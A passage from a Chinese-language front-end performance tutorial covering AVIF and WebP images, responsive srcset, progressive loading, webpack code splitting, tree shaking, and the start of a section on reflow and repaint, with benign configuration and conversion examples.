plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;picture&gt;<br>  &lt;!-- 优先AVIF --&gt;<br>  &lt;source srcset=&quot;image.avif&quot; type=&quot;image/avif&quot;&gt;<br>  <br>  &lt;!-- 次选WebP --&gt;<br>  &lt;source srcset=&quot;image.webp&quot; type=&quot;image/webp&quot;&gt;<br>  <br>  &lt;!-- 兜底方案 --&gt;<br>  &lt;img src=&quot;image.jpg&quot; alt=&quot;示例图片&quot;&gt;<br>&lt;/picture&gt;<br></code></pre></td></tr></table></figure><p>(2) 转换工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># WebP转换（质量80）</span><br>cwebp -q 80 input.jpg -o output.webp<br><br><span class="hljs-comment"># 批量转换（imagemagick）</span><br>magick mogrify -format webp -quality 85 *.jpg<br></code></pre></td></tr></table></figure><p><strong>AVIF 进阶特性</strong></p><p>核心优势：</p><ul><li>极致压缩率：比WebP再节省20-30%</li><li>12bit色深：完美还原HDR内容</li><li>无损压缩：压缩率比PNG高50%</li></ul><p>部署配置：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># Nginx添加MIME类型</span><br><span class="hljs-section">types</span> &#123;<br>    image/<span class="hljs-attribute">avif</span>  avif;<br>&#125;<br></code></pre></td></tr></table></figure><p>转换工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># AVIF编码（CPU密集型）</span><br>avifenc --speed 0 --quality 50 input.jpg output.avif<br></code></pre></td></tr></table></figure><p><strong>响应式图片（srcset）</strong></p><p>设备适配方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;img srcset=&quot;<br>  small.jpg  480w,<br>  medium.jpg 768w,<br>  large.jpg  1200w&quot;<br> sizes=&quot;(max-width: 600px) 480px,<br>        (max-width: 1024px) 768px,<br>        1200px&quot;<br> src=&quot;fallback.jpg&quot;<br> alt=&quot;响应式图片示例&quot;&gt;<br></code></pre></td></tr></table></figure><p>sizes 计算规则：</p><pre class="mermaid">graph TD    A[视口宽度] --> B{匹配media条件}    B -->|600px↓| C[使用480px]    B -->|601-1024px| D[使用768px]    B -->|1025px↑| E[使用1200px]</pre><p>像素密度适配：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 2x高清屏适配 --&gt;<br>&lt;img srcset=&quot;<br>  image@1x.jpg 1x,<br>  image@2x.jpg 2x,<br>  image@3x.jpg 3x&quot;<br> src=&quot;image@1x.jpg&quot; <br> alt=&quot;高DPI适配&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>渐进加载（Progressive Loading）</strong></p><p>实现方案对比：</p><table><thead><tr><th align="left">技术</th><th align="left">实现方式</th><th align="left">用户体验</th></tr></thead><tbody><tr><td align="left">基线JPEG</td><td align="left">顺序加载</td><td align="left">从上到下扫描</td></tr><tr><td align="left">渐进式JPEG</td><td align="left">多次扫描渲染</td><td align="left">模糊→清晰</td></tr><tr><td align="left">WebP渐进</td><td align="left">内置渐进加载</td><td align="left">同JPEG但更快</td></tr><tr><td align="left">LQIP占位</td><td align="left">加载超小预览图（20px宽）</td><td align="left">先显示模糊预览</td></tr></tbody></table><p>生成渐进JPEG：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ImageMagick转换</span><br>convert input.jpg -interlace Plane progressive.jpg<br><br><span class="hljs-comment"># MozJPEG工具</span><br>cjpeg -progressive -quality 85 input.png &gt; output.jpg<br></code></pre></td></tr></table></figure><p>现代实现框架：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs HTML">// 使用loading=&quot;lazy&quot; + 模糊占位<br>&lt;img <br>  src=&quot;tiny-preview.jpg&quot; <br>  data-src=&quot;full.jpg&quot; <br>  loading=&quot;lazy&quot;<br>  style=&quot;filter: blur(5px)&quot;<br>  onload=&quot;this.style.filter=&#x27;none&#x27;&quot;<br>&gt;<br></code></pre></td></tr></table></figure><p><strong>图片格式选择决策策略</strong></p><pre class="mermaid">graph TD    A[图片类型] --> B{需要动画?}    B -->|是| C[WebP/AVIF]    B -->|否| D{需要透明度?}    D -->|是| E{需要无损?}    E -->|是| F[PNG/AVIF]    E -->|否| G[WebP/AVIF]    D -->|否| H{高画质要求?}    H -->|是| I[AVIF]    H -->|否| J[WebP]</pre><p><strong>浏览器兼容性</strong></p><table><thead><tr><th align="left">浏览器</th><th align="left">WebP支持</th><th align="left">AVIF支持</th><th align="left">响应式图片</th></tr></thead><tbody><tr><td align="left">Chrome</td><td align="left">✅ 32+</td><td align="left">✅ 85+</td><td align="left">✅ 完全</td></tr><tr><td align="left">Firefox</td><td align="left">✅ 65+</td><td align="left">✅ 86+</td><td align="left">✅ 完全</td></tr><tr><td align="left">Safari</td><td align="left">✅ 14+</td><td align="left">✅ 16.1+</td><td align="left">✅ 完全</td></tr><tr><td align="left">Edge</td><td align="left">✅ 18+</td><td align="left">✅ 85+</td><td align="left">✅ 完全</td></tr><tr><td align="left">IE 11</td><td align="left">❌</td><td align="left">❌</td><td align="left">❌</td></tr></tbody></table><h3 id="代码拆分：动态import-、Webpack-SplitChunks"><a href="#代码拆分：动态import-、Webpack-SplitChunks" class="headerlink" title="代码拆分：动态import()、Webpack SplitChunks"></a>代码拆分：动态import()、Webpack SplitChunks</h3><p><strong>代码拆分核心目标</strong></p><ul><li>减少初始负载：仅加载当前路由必需代码</li><li>提升交互响应：延迟加载非关键功能</li><li>缓存优化：分离频繁变更与稳定代码</li></ul><p><strong>动态 import() 实现机制</strong></p><p>基本语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 静态导入（传统方式）</span><br><span class="hljs-keyword">import</span> utils <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./utils&#x27;</span>; <br><br><span class="hljs-comment">// 动态导入（返回Promise）</span><br><span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./utils&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">module</span> =&gt;</span> &#123;<br>  <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">doSomething</span>();<br>&#125;);<br></code></pre></td></tr></table></figure><p>React 组件级拆分：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProductList</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./ProductList&#x27;</span>));<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Spinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ProductList</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>Vue 异步组件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">AdminPanel</span> = (<span class="hljs-params"></span>) =&gt; (&#123;<br>  <span class="hljs-attr">component</span>: <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./AdminPanel.vue&#x27;</span>),<br>  <span class="hljs-attr">loading</span>: <span class="hljs-title class_">LoadingComponent</span>,<br>  <span class="hljs-attr">delay</span>: <span class="hljs-number">200</span> <span class="hljs-comment">// 延迟显示loading</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>Webpack SplitChunks 高级配置</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">optimization</span>: &#123;<br>    <span class="hljs-attr">splitChunks</span>: &#123;<br>      <span class="hljs-attr">chunks</span>: <span class="hljs-string">&#x27;all&#x27;</span>,<br>      <span class="hljs-attr">cacheGroups</span>: &#123;<br>        <span class="hljs-attr">vendors</span>: &#123;<br>          <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/]/</span>,<br>          <span class="hljs-attr">priority</span>: -<span class="hljs-number">10</span><br>        &#125;,<br>        <span class="hljs-attr">default</span>: &#123;<br>          <span class="hljs-attr">minChunks</span>: <span class="hljs-number">2</span>,<br>          <span class="hljs-attr">priority</span>: -<span class="hljs-number">20</span>,<br>          <span class="hljs-attr">reuseExistingChunk</span>: <span class="hljs-literal">true</span><br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>关键配置参数：</p><table><thead><tr><th align="left">参数</th><th align="left">类型</th><th align="left">功能</th><th align="left">推荐值</th></tr></thead><tbody><tr><td align="left">minSize</td><td align="left">number</td><td align="left">生成块的最小尺寸</td><td align="left">20000 (20KB)</td></tr><tr><td align="left">maxSize</td><td align="left">number</td><td align="left">尝试拆分的最大尺寸</td><td align="left">0 (无限制)</td></tr><tr><td align="left">minChunks</td><td align="left">number</td><td align="left">被引用次数阈值</td><td align="left">2</td></tr><tr><td align="left">chunks</td><td align="left">string</td><td align="left">选择块类型（all&#x2F;async&#x2F;initial）</td><td align="left">‘all’</td></tr><tr><td align="left">automaticNameDelimiter</td><td align="left">string自动命名分隔符</td><td align="left">‘~’</td><td align="left"></td></tr></tbody></table><p><strong>拆分配置策略</strong></p><p>(1) 第三方库分离</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">cacheGroups</span>: &#123;<br>  <span class="hljs-attr">reactVendor</span>: &#123;<br>    <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/](react|react-dom)[\\/]/</span>,<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;react-vendor&#x27;</span>,<br>    <span class="hljs-attr">chunks</span>: <span class="hljs-string">&#x27;all&#x27;</span><br>  &#125;,<br>  <span class="hljs-attr">utilityVendor</span>: &#123;<br>    <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/](lodash|moment)[\\/]/</span>,<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;utility-vendor&#x27;</span>,<br>    <span class="hljs-attr">chunks</span>: <span class="hljs-string">&#x27;all&#x27;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) 业务模块分离</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">cacheGroups</span>: &#123;<br>  <span class="hljs-attr">userModule</span>: &#123;<br>    <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]src[\\/]modules[\\/]user[\\/]/</span>,<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;user-module&#x27;</span>,<br>    <span class="hljs-attr">chunks</span>: <span class="hljs-string">&#x27;async&#x27;</span> <span class="hljs-comment">// 仅异步加载</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) 公共模块提取</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">cacheGroups</span>: &#123;<br>  <span class="hljs-attr">common</span>: &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;common&#x27;</span>,<br>    <span class="hljs-attr">minChunks</span>: <span class="hljs-number">2</span>, <span class="hljs-comment">// 被2个以上入口引用</span><br>    <span class="hljs-attr">chunks</span>: <span class="hljs-string">&#x27;initial&#x27;</span>,<br>    <span class="hljs-attr">priority</span>: -<span class="hljs-number">20</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>路由级代码拆分</strong></p><p>(1) React Router实现</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> &#123; lazy, <span class="hljs-title class_">Suspense</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Routes</span>, <span class="hljs-title class_">Route</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Home</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./routes/Home&#x27;</span>));<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">About</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./routes/About&#x27;</span>));<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">FullPageSpinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Home</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/about&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">About</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) Vue Router 实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> routes = [<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>,<br>    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./views/Home.vue&#x27;</span>)<br>  &#125;,<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/product&#x27;</span>,<br>    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;product&quot; */</span> <span class="hljs-string">&#x27;./views/Product.vue&#x27;</span>)<br>  &#125;<br>];<br></code></pre></td></tr></table></figure><p><strong>预加载 - webpack 魔法注释</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 常规加载</span><br><span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;chart&quot; */</span> <span class="hljs-string">&#x27;./Chart&#x27;</span>);<br><br><span class="hljs-comment">// 空闲时预加载</span><br><span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;chart&quot;, webpackPrefetch: true */</span> <span class="hljs-string">&#x27;./Chart&#x27;</span>);<br><br><span class="hljs-comment">// 高优先级预加载</span><br><span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;auth&quot;, webpackPreload: true */</span> <span class="hljs-string">&#x27;./Auth&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="Tree-Shaking-ES-Module-静态分析"><a href="#Tree-Shaking-ES-Module-静态分析" class="headerlink" title="Tree Shaking (ES Module 静态分析)"></a>Tree Shaking (ES Module 静态分析)</h3><p><strong>Tree Shaking 核心机制</strong></p><p>工作原理：</p><pre class="mermaid">graph LR    A[源代码] --> B{ES Module 静态分析}    B --> C[识别导出/导入关系]    C --> D[构建依赖图]    D --> E[标记未使用代码]    E --> F[移除“死代码”]</pre><ul><li>静态分析基础：ES Module 的 import&#x2F;export 必须在顶层声明（非动态）</li><li>副作用检测：识别可能影响全局状态的代码（如 polyfill）</li><li>安全删除：仅移除确定未使用的纯函数代码</li></ul><p>与传统打包对比：</p><table><thead><tr><th align="left">特性</th><th align="left">普通打包</th><th align="left">Tree Shaking</th></tr></thead><tbody><tr><td align="left">代码包含</td><td align="left">全部模块</td><td align="left">仅实际使用的导出</td></tr><tr><td align="left">依赖分析</td><td align="left">文件级</td><td align="left">函数&#x2F;变量级</td></tr><tr><td align="left">适用模块</td><td align="left">CommonJS&#x2F;AMD</td><td align="left">ES Module</td></tr><tr><td align="left">输出大小</td><td align="left">较大</td><td align="left">显著减小</td></tr></tbody></table><p><strong>ES Module 静态特性</strong></p><p>(1) 可摇树优化的代码特征</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 可安全移除（未使用导出）</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">util1</span> = (<span class="hljs-params"></span>) =&gt; &#123;...&#125;  <span class="hljs-comment">// ❌ 将被移除</span><br><br><span class="hljs-comment">// 被使用的导出</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">util2</span> = (<span class="hljs-params"></span>) =&gt; &#123;...&#125;  <span class="hljs-comment">// ✅ 保留</span><br><br><span class="hljs-comment">// 副作用代码（需特殊标记）</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">initSDK</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-property">_track</span> = <span class="hljs-literal">true</span>  <span class="hljs-comment">// 有全局副作用！</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(2) 不可摇树的情况</p><table><thead><tr><th align="left">代码模式</th><th align="left">原因</th><th align="left">解决方案</th></tr></thead><tbody><tr><td align="left">动态导入import()</td><td align="left">运行时依赖分析</td><td align="left">配置sideEffects: false</td></tr><tr><td align="left">CommonJS 模块</td><td align="left">动态导出结构</td><td align="left">转换为ES Module</td></tr><tr><td align="left">原型方法扩展</td><td align="left">隐式副作用</td><td align="left">避免修改内置原型</td></tr></tbody></table><p><strong>Webpack 实现详解</strong></p><p>(1) 基础配置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;production&#x27;</span>, <span class="hljs-comment">// 必须生产模式</span><br>  <span class="hljs-attr">optimization</span>: &#123;<br>    <span class="hljs-attr">usedExports</span>: <span class="hljs-literal">true</span>,  <span class="hljs-comment">// 启用标记</span><br>    <span class="hljs-attr">minimize</span>: <span class="hljs-literal">true</span>,     <span class="hljs-comment">// 启用代码压缩</span><br>    <span class="hljs-attr">sideEffects</span>: <span class="hljs-literal">true</span>   <span class="hljs-comment">// 开启副作用分析</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) package.json 关键声明</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my-library&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;sideEffects&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 声明无副作用</span><br>  <span class="hljs-attr">&quot;sideEffects&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>       <span class="hljs-comment">// 或声明有副作用的文件</span><br>    <span class="hljs-string">&quot;**/*.css&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;src/polyfill.js&quot;</span><br>  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>优化实践</strong></p><p>(1) 库开发规范</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 正确：独立导出函数</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) &#123; <span class="hljs-keyword">return</span> a + b &#125;<br><br><span class="hljs-comment">// 错误：聚合导出对象（难优化）</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) &#123; ... &#125;,<br>  <span class="hljs-title function_">subtract</span>(<span class="hljs-params">a, b</span>) &#123; ... &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) Babel 配置</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-comment">// .babelrc</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;presets&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>    <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;@babel/preset-env&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;modules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// 保留ES Module</span><br>  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>(3) 副作用显式标记</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">/*#__PURE__*/</span> <br><span class="hljs-keyword">const</span> result = <span class="hljs-title function_">calculate</span>(); <span class="hljs-comment">// 提示可安全移除</span><br><br><span class="hljs-comment">// 或使用Webpack魔法注释</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">init</span> = (<span class="hljs-params"></span>) =&gt; &#123; ... &#125; <span class="hljs-comment">/* webpackExports: [&quot;init&quot;] */</span><br></code></pre></td></tr></table></figure><p><strong>Tree Shaking 三阶段流程</strong></p><pre class="mermaid">sequenceDiagram    participant W as Webpack    participant T as Terser    W->>W: 1. 标记阶段<br>（usedExports: true）    Note right of W: 生成未使用代码列表<br>但不实际删除    W->>T: 2. 传递优化标记    T->>T: 3. 压缩阶段实际移除<br>（dead_code elimination）    T-->>W: 返回精简后的bundle</pre><h1 id="三、渲染性能优化"><a href="#三、渲染性能优化" class="headerlink" title="三、渲染性能优化"></a>三、渲染性能优化</h1><h2 id="3-1-DOM-操作优化"><a href="#3-1-DOM-操作优化" class="headerlink" title="3.1 DOM 操作优化"></a>3.1 DOM 操作优化</h2><h3 id="避免重排（Reflow）与重绘（Repaint）"><a href="#避免重排（Reflow）与重绘（Repaint）" class="headerlink" title="避免重排（Reflow）与重绘（Repaint）"></a>避免重排（Reflow）与重绘（Repaint）</h3><p><strong>浏览器渲染管线核心流程</strong></p><pre class="mermaid">sequenceDiagram    JavaScript->>样式计算: 修改DOM/CSS    样式计算->>布局: 计算样式    布局->>重排: 计算几何属性    重排->>重绘: 生成绘制指令    重绘->>合成: 栅格化处理    合成->>显示: 输出到屏幕</pre><ul><li>重排（Reflow）：重新计算元素几何属性（位置&#x2F;尺寸）</li><li>重绘（Repaint）：重新绘制元素外观（颜色&#x2F;背景等）</li><li>关键结论：重排必导致重绘，重绘不一定触发重排</li></ul><p><strong>触发重排的操作清单</strong></p><table><thead><tr><th align="left">操作类型</th><th align="left">具体示例</th><th align="left">影响范围</th></tr></thead><tbody><tr><td align="left">尺寸变化</td><td align="left">elem.style.width &#x3D; ‘500px’</td><td align="left">自身及子元素</td></tr><tr><td align="left">位置变化</td><td align="left">elem.style.marginTop &#x3D; 